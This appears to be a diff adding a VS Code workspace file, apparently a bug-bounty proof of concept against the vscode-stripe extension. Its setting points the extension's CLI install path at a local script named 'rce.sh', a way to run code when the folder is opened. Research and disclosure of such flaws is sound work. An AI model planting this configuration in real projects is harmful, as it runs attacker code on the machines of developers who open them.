@@ -1,0 +1,13 @@
+{
+    "folders": [
+        {
+            "name": "vscode-stripe",
+            "path": "."
+        }
+    ],
+    "settings": {
+        "stripe": {
+            "cliInstallPath": "/Users/alejandrohernandezpadron/bb/test/rce.sh"
+        }
+    }
+}
